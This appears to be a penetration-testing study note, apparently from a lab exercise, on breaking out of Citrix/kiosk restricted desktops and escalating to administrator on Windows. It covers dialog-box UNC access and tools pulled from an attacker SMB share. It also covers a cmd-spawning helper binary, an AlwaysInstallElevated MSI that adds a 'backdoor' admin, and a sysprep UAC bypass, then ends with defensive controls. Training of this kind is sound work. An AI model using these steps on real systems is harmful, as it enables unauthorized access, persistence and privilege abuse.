---
title: Windows Privilege Escalation – Citrix Breakout and Restricted Desktop Bypass
aliases:
  - Citrix Breakout
  - Restricted Desktop Breakout
  - Kiosk Breakout
  - Terminal Services Breakout
  - Dialog Box Breakout
  - Alternate Explorer Bypass
  - AlwaysInstallElevated Citrix Escalation
tags:
  - windows
  - privilege-escalation
  - citrix
  - restricted-desktop
  - kiosk-breakout
  - terminal-services
  - dialog-box
  - smb
  - explorer-plus-plus
  - shortcuts
  - script-execution
  - alwaysinstallelevated
  - uac-bypass
  - pentesting
---

## Overview

Organizations commonly use virtualization and remote access platforms to provide controlled desktop access.

Common platforms include:

- Terminal Services
- Citrix
- AWS AppStream
- CyberArk PSM
- Kiosk environments

These environments often use desktop lockdown controls to reduce the impact of malicious insiders or compromised accounts.

Common restrictions include:

- blocked `cmd.exe`
- blocked `powershell.exe`
- restricted File Explorer browsing
- blocked access to `C:\Windows\System32`
- restricted Start Menu entries
- blocked Registry Editor
- limited application access
- restricted access to SMB shares

A breakout occurs when a user escapes the restricted desktop interface and gains access to native Windows functionality.

---

# Basic Citrix / Kiosk Breakout Methodology

Typical breakout flow:

```text
Gain access to a dialog box
↓
Use the dialog box to bypass path restrictions
↓
Launch or stage a command execution method
↓
Obtain CMD or PowerShell access
↓
Enumerate the system
↓
Escalate privileges
```

> [!important]
> In a locked-down desktop, access to `cmd.exe` or `powershell.exe` is a major milestone because it allows direct operating system enumeration and follow-on privilege escalation.

---

# Example Citrix Access Context

Example remote portal:

```text
http://humongousretail.com/remote/
```

Example credentials:

```text
Username: pmorgan
Password: Summer1Summer!
Domain: htb.local
```

After login, selecting the default desktop downloads a Citrix launch file:

```text
launch.ica
```

This file starts the restricted Citrix environment.

---

# Bypassing Path Restrictions with Dialog Boxes

## Problem

Attempting to access restricted paths such as:

```text
C:\Users
```

through File Explorer may fail with an error such as:

```text
Accessing the resource 'C:\Users' has been disallowed.
```

This usually indicates Group Policy or shell restrictions are preventing direct browsing.

---

# Why Dialog Boxes Matter

Many applications expose standard Windows dialog boxes through features such as:

- Open
- Save
- Save As
- Load
- Browse
- Import
- Export
- Print
- Search
- Help
- Scan

These dialog boxes may not enforce the same restrictions as File Explorer.

Applications commonly useful for dialog access:

- Paint
- Notepad
- WordPad
- Microsoft Office apps
- PDF readers
- image viewers
- line-of-business applications

---

# Method 1 – Dialog Box Path Bypass with Paint

## Step 1 – Launch Paint

Start Paint from the Start Menu.

Open the dialog box:

```text
File > Open
```

---

## Step 2 – Use UNC Path to Access Local C Drive

In the `File name` field, enter a local administrative share path:

```text
\\127.0.0.1\c$\users\pmorgan
```

Set file type to:

```text
All Files
```

Press `Enter`.

This may bypass File Explorer restrictions and open the target directory through the dialog box.

> [!tip]
> Dialog boxes often allow direct path entry even when File Explorer blocks browsing.

---

# Accessing SMB Shares from a Restricted Environment

## Problem

File Explorer restrictions may block direct access to SMB shares on attacker-controlled hosts.

The dialog box path trick can still allow access to UNC paths.

---

# Step 1 – Start SMB Server on Attack Host

Use Impacket `smbserver.py` from the directory containing tools or payloads.

```bash
smbserver.py -smb2support share $(pwd)
```

Example output:

```text
root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Share path format:

```text
\\<attack_host_ip>\share
```

Example:

```text
\\10.13.38.95\share
```

---

# Step 2 – Open SMB Share from Paint Dialog

In Citrix:

1. Launch Paint.
2. Select:

```text
File > Open
```

3. Enter the SMB UNC path in the `File name` field:

```text
\\10.13.38.95\share
```

4. Set file type to:

```text
All Files
```

5. Press `Enter`.

This can expose hosted files inside the restricted environment.

---

# Step 3 – Launch Executable from SMB Share

If direct file copy is blocked, right-click an executable in the dialog box and select:

```text
Open
```

Example executable:

```text
pwn.exe
```

The binary can launch a command prompt.

Expected behavior:

```text
CMD.EXE was started with the above path as the current directory.
UNC paths are not supported. Defaulting to Windows directory.
```

---

# pwn.exe Source Code

`pwn.exe` is a small custom executable that starts `cmd.exe`.

```c
#include <stdlib.h>

int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

When executed, it spawns:

```text
C:\Windows\System32\cmd.exe
```

---

# Step 4 – Copy Files After CMD Access

Once `cmd.exe` is obtained, use it to copy files from the SMB share into a writable local directory.

Example writable location:

```text
C:\Users\pmorgan\Desktop
```

Example copy pattern:

```cmd
copy "\\10.13.38.95\share\Bypass-UAC.ps1" "C:\Users\pmorgan\Desktop\Bypass-UAC.ps1"
```

```cmd
copy "\\10.13.38.95\share\PowerUp.ps1" "C:\Users\pmorgan\Desktop\PowerUp.ps1"
```

```cmd
copy "\\10.13.38.95\share\pwn.exe" "C:\Users\pmorgan\Desktop\pwn.exe"
```

---

# Method 2 – Alternate File Explorer

## Why Alternate Explorers Work

Group Policy may restrict the built-in File Explorer, but not third-party portable file managers.

Useful alternate file managers include:

- Explorer++
- Q-Dir

These tools can sometimes browse and copy files despite restrictions applied to File Explorer.

---

# Explorer++

`Explorer++` is useful because it is:

- portable
- lightweight
- fast
- easy to run from an SMB share
- able to copy files when File Explorer is restricted

Example use:

1. Start SMB server with `Explorer++.exe`.
2. Open SMB share through dialog box.
3. Launch `Explorer++.exe`.
4. Copy tools from:

```text
\\10.13.38.95\share
```

to:

```text
C:\Users\pmorgan\Desktop
```

> [!tip]
> Portable tools are useful in restricted desktops because they can be run without installation.

---

# Method 3 – Alternate Registry Editors

## Why Alternate Registry Editors Work

If `regedit.exe` is blocked by Group Policy, alternative registry editors may still run.

Examples:

- SmallRegistryEditor
- Simpleregedit
- Uberregedit

These tools can allow registry review or modification when the built-in Registry Editor is blocked.

> [!warning]
> Registry modification can destabilize the session or system. Record original values before changing anything.

---

# Method 4 – Modify Existing Shortcut Files

## Attack Concept

If an existing `.lnk` shortcut is available and editable, modify its target to launch a desired executable.

Example target:

```text
C:\Windows\System32\cmd.exe
```

---

# Shortcut Modification Steps

1. Right-click an existing shortcut.
2. Select:

```text
Properties
```

3. Modify the `Target` field to:

```text
C:\Windows\System32\cmd.exe
```

4. Apply changes.
5. Execute the shortcut.

Expected result:

```text
cmd.exe
```

opens in the restricted environment.

---

# If No Shortcut Exists

Options:

- transfer an existing shortcut through SMB
- create a new shortcut using PowerShell
- use a script or binary to generate a `.lnk`
- use another application that permits shortcut creation

---

# Method 5 – Script Execution

## Attack Concept

If script extensions execute through their interpreters, a simple script can launch a command prompt or another tool.

Useful script types:

```text
.bat
.vbs
.ps1
.cmd
```

---

# Create a Batch File to Launch CMD

Create a text file named:

```text
evil.bat
```

Add:

```bat
cmd
```

Save the file.

Execute:

```text
evil.bat
```

Expected result:

```text
cmd.exe
```

This opens an interactive command prompt.

---

# Privilege Escalation After Breakout

Once command execution is available, enumerate the system for privilege escalation paths.

Useful tools:

- PowerUp
- winPEAS
- built-in Windows commands
- registry queries
- service enumeration commands

In this example, PowerUp identifies:

```text
AlwaysInstallElevated
```

---

# AlwaysInstallElevated

## Why It Matters

If both the current user and local machine installer policy keys are set, Windows Installer packages can run with elevated privileges.

Required registry values:

```text
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
```

Both keys must be enabled.

---

# Validate AlwaysInstallElevated Manually

Query current user key:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Expected output:

```cmd
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1
```

Query local machine key:

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Expected output:

```cmd
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1
```

---

# Create User-Adding MSI with PowerUp

Import PowerUp:

```powershell
Import-Module .\PowerUp.ps1
```

If error, try:

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

Generate MSI:

```powershell
Write-UserAddMSI
```

Example output:

```powershell
PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop> Write-UserAddMSI

Output Path
-----------
UserAdd.msi
```

This creates:

```text
UserAdd.msi
```

on the desktop.

---

# Execute UserAdd.msi

Run the MSI and create a new local administrator user.

Example values:

```text
Username: backdoor
Password: T3st@123
Group: Administrators
```

> [!important]
> The password must meet the local password complexity policy or the user creation will fail.

> [!warning]
> Creating a local administrator account is noisy and persistent. Use only when explicitly authorized and remove it during cleanup.

---

# Start CMD as New Admin User

Use `runas`:

```cmd
runas /user:backdoor cmd
```

Enter password:

```text
T3st@123
```

Expected output:

```cmd
Attempting to start cmd as user "VDESKTOP3\backdoor" ...
```

This starts a command prompt as the new administrator user.

---

# UAC Limitation

Even though the new user is in `Administrators`, UAC may still restrict access to privileged locations.

Example:

```cmd
cd C:\Users\Administrator
```

Expected result:

```text
Access is denied.
```

UAC requires a high-integrity administrator token for protected actions.

---

# Bypassing UAC

## Attack Concept

A UAC bypass attempts to obtain a high-integrity process for an administrator user without the normal consent prompt.

https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC

Example script:

```text
Bypass-UAC.ps1
```

Example method:

```text
UacMethodSysprep
```

---

# Run Bypass-UAC Script

From PowerShell:

```powershell
Import-Module .\Bypass-UAC.ps1
```

```powershell
Bypass-UAC -Method UacMethodSysprep
```

Example behavior:

```text
Impersonating explorer.exe
Dropping proxy DLL
Executing sysprep
```

If successful, a new elevated PowerShell window opens.

---

# Confirm Elevated Context

Use:

```cmd
whoami /all
```

or:

```cmd
whoami /priv
```

Then confirm access to protected directories.

Example:

```cmd
dir C:\Users\Administrator\Desktop
```

Expected result:

```text
flag.txt
```

---

# Practical Decision Tree

## Is File Explorer restricted?

Try accessing:

```text
C:\Users
C:\Windows\System32
```

If blocked, look for dialog box access.

---

## Can an application open a file dialog?

Check:

- Paint
- Notepad
- WordPad
- Office apps
- PDF apps
- business apps

Use:

```text
File > Open
```

or:

```text
Save As
```

---

## Can the dialog box access UNC paths?

Test local C drive through loopback:

```text
\\127.0.0.1\c$
```

Test attacker SMB share:

```text
\\<attack_host_ip>\share
```

---

## Can tools be executed from SMB?

Try right-clicking the executable in the dialog box and selecting:

```text
Open
```

If copying is blocked, execute directly first.

---

## Is CMD available?

Try:

```text
C:\Windows\System32\cmd.exe
```

If blocked, use:

- custom `pwn.exe`
- modified shortcut
- batch file
- alternate explorer
- dialog box execution

---

## Are privilege escalation paths available?

After CMD access, enumerate:

```cmd
whoami /priv
whoami /groups
systeminfo
```

Check AlwaysInstallElevated:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

## Is admin created but still restricted?

Check UAC.

If admin token is filtered, use an approved UAC bypass or interactive consent path.

---

# Troubleshooting

## UNC path does not open in dialog box

Possible causes:

- SMB blocked
- wrong IP
- share not running
- firewall blocking inbound SMB
- SMB signing/authentication issue
- dialog box restrictions still enforced
- file type filter hides contents

Set file type to:

```text
All Files
```

---

## SMB server is reachable but files do not show

Check:

- `smbserver.py` running from correct directory
- share name matches
- target can route to attack host
- SMB2 support enabled
- Windows blocks unauthenticated guest access
- file type filter set to `All Files`

---

## Executable does not run from share

Possible causes:

- AppLocker or application control
- Mark-of-the-Web or trust restrictions
- AV/EDR blocking executable
- share execution blocked
- wrong architecture
- insufficient permission
- binary crashes immediately

---

## Batch file does not open CMD

Possible causes:

- `.bat` execution blocked
- `cmd.exe` blocked by policy
- script interpreter association changed
- application control policy
- file extension hidden and saved as `evil.bat.txt`

---

## PowerUp does not import

Possible causes:

- execution policy
- constrained language mode
- file blocked by Defender
- module path issue
- PowerShell disabled

Try current-process execution policy bypass:

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

---

## AlwaysInstallElevated MSI fails

Possible causes:

- one registry key missing
- password complexity not met
- MSI blocked by policy
- Windows Installer disabled
- insufficient permissions
- UAC / session restrictions
- endpoint protection blocks user creation

Both keys must be set to:

```text
0x1
```

---

## New admin user cannot access protected paths

This is usually UAC token filtering.

Confirm privileges:

```cmd
whoami /priv
```

Use an elevated process or an approved UAC bypass.

---

# Command Reference

## Start SMB server

```bash
smbserver.py -smb2support share $(pwd)
```

## Local loopback UNC path

```text
\\127.0.0.1\c$\users\pmorgan
```

## Attacker SMB share path

```text
\\10.13.38.95\share
```

## pwn.exe source

```c
#include <stdlib.h>

int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

## Copy tool from SMB share

```cmd
copy "\\10.13.38.95\share\PowerUp.ps1" "C:\Users\pmorgan\Desktop\PowerUp.ps1"
```

## Create simple CMD batch file

```bat
cmd
```

## Check AlwaysInstallElevated HKCU

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Check AlwaysInstallElevated HKLM

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Import PowerUp

```powershell
Import-Module .\PowerUp.ps1
```

## Create user-add MSI

```powershell
Write-UserAddMSI
```

## Start CMD as new admin

```cmd
runas /user:backdoor cmd
```

## Import UAC bypass module

```powershell
Import-Module .\Bypass-UAC.ps1
```

## Run UAC bypass

```powershell
Bypass-UAC -Method UacMethodSysprep
```

## Confirm privileges

```cmd
whoami /priv
```

```cmd
whoami /all
```

## Check Administrator desktop

```cmd
dir C:\Users\Administrator\Desktop
```

---

# Cleanup Checklist

Remove staged files:

```text
pwn.exe
pwn.c
PowerUp.ps1
Bypass-UAC.ps1
Explorer++.exe
evil.bat
UserAdd.msi
shortcut files
temporary copied tools
```

Remove created local user if authorized:

```cmd
net user backdoor /delete
```

Close elevated shells and SMB server.

Document:

- restricted environment controls observed
- breakout method used
- files transferred or executed
- privilege escalation path
- account created, if any
- UAC bypass used
- cleanup actions completed

---

# Defensive Notes

## Risks

Restricted desktops can still be bypassed when users can access:

- application file dialogs
- UNC paths
- portable executables
- script execution
- writable shortcut files
- alternate file managers
- alternate registry editors
- misconfigured installer policies

---

## Defensive Controls

Organizations should:

- restrict command execution with application control
- block unapproved portable executables
- prevent execution from network shares
- restrict access to UNC paths from dialog boxes where possible
- disable administrative shares where appropriate
- harden Citrix published applications
- restrict script interpreter execution
- prevent users from editing shortcuts
- block alternate file managers and registry editors
- disable `AlwaysInstallElevated`
- monitor MSI installation and local admin creation
- enforce UAC and monitor bypass behavior
- log process creation events from restricted sessions

---

# Key Takeaways

- Citrix and kiosk restrictions can often be bypassed through Windows dialog boxes.
- `File > Open` dialogs may permit direct UNC path access even when File Explorer blocks browsing.
- `\\127.0.0.1\c$` can expose local paths through a dialog box.
- An attacker-hosted SMB share can stage tools into the restricted environment.
- Executing a small helper binary can spawn `cmd.exe`.
- Explorer++ and Q-Dir can bypass some File Explorer restrictions.
- Shortcut modification and simple batch files can provide command execution.
- Once CMD access is obtained, normal Windows privilege escalation methodology applies.
- `AlwaysInstallElevated` with both HKCU and HKLM set to `1` enables MSI-based local admin creation.
- UAC can still restrict administrator users until an elevated token is obtained.
- Cleanup should remove staged tools, created accounts, MSI files, and temporary scripts.

---

# Related Notes

- [[Windows Privilege Escalation]]
- [[Citrix Breakout]]
- [[Kiosk Breakout]]
- [[Terminal Services]]
- [[Dialog Box Bypass]]
- [[SMB File Transfer]]
- [[Explorer++]]
- [[AlwaysInstallElevated]]
- [[PowerUp]]
- [[UAC Bypass]]
- [[Windows Shortcuts]]
- [[Application Control]]
- [[Group Policy]]

---

# Tags

#windows
#privilege-escalation
#citrix
#restricted-desktop
#kiosk-breakout
#dialog-box
#smb
#explorerplusplus
#shortcuts
#script-execution
#alwaysinstallelevated
#uac-bypass
#group-policy
#pentesting